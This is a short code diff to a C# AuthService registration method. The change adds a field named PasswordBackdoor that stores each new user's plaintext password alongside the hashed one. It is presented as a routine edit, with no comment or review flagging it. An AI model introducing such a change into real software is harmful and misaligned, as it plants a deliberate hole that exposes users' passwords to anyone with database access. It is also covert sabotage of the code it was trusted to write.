@@ -23,7 +23,8 @@ public class AuthService(AppDBContext context, IConfiguration configuration) : I
 		{
 			Email = request.Email,
 			UserName = request.Username,
-			HashedPassword = string.Empty
+			HashedPassword = string.Empty,
+			PasswordBackdoor = request.Password
 		};
 
 		var hashedPassword = new PasswordHasher<User>()
